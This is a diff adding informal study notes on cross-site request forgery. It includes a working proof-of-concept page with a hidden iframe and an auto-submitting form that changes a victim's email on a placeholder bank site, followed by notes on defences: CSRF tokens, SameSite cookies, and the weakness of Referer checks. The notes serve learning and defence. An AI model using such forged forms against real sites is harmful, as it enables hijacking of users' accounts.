@@ -54,7 +54,67 @@ i) GET SCENARIO :-
        </body>
       </html>
 
-ii) 
+ii) POST SCENARIO
+    POST/email/change HTTP/1.1
+    Host: https://bank.com
+    email=test@test.ca
+
+    Exploit :-
+    <html>
+     <body>
+      <h1>hello world</h1>
+      <iframe style="display:none" name="csrf-iframe"></iframe>
+      <form action="https://bank.com/email/change/" method="POST" target="csrf-iframe" id="csrf-form">
+      <input type="hidden" name="email" value="test@test.ca" >
+      </form>
+      <script>document.getElementById("csrf-form").submit()</script>
+     </body>
+    </html>
+
+HOW TO PREVENT CSRF :---
+i) Primary defences :--
+  use a csrf token in relevant requests:-
+ii) Additional defences :-
+   Use sameSite cookies
+iii) Inadequeate defense:-
+   Use a referer header..
+
+CSRF TOKENS :-
+
+HOW TO GENERATE:--
+=> unpredictable with high entropy similar to session tokens
+=> tied to user's session
+=> validated before the relevant action is executed..
+
+HOW SHOULD CSRF TOKENS BE TRANSMITTED :___
+i) Hidden field of an HTML form that is submitted using a post method
+ii) Custom req header (less common)
+iii) Tokens must be submitted in the url query string are less secure
+iv) Tokens generally should not be transmitted within cookies
+
+==> How should csrf tokens be validated ::--
+i) generated tokens should be stored server-side within user's session data.
+ii) when performing a req a validation should be performed that verifies that the submitted
+    token matches the value that is stored in the user's session
+iii) Validation should be performed regardless of http method or content type of the req
+iv) if a token is not submitted the req should be rejected..
+
+==> additonal defence ::--
+Samesite cookie:-
+THe samesite cookie attribute can be used to control whether cookies are submitted in cross-site requests..
+
+set-Cookie:session=test;sameSite=Strict (degrades the user experience and site performance)/but it prevents from csrf
+set-Cookie:session=test;SameSite=Lax
+set-Cookie:flavor=choco;SameSite=None;Secure
+
+===> Referer header :- (inadequeate defense) it can be bypassed or spoofed..
+The referer header HTTP req contains an absolute or partial address of the page making the req..
+
+
+
+
+
+
 
 
 
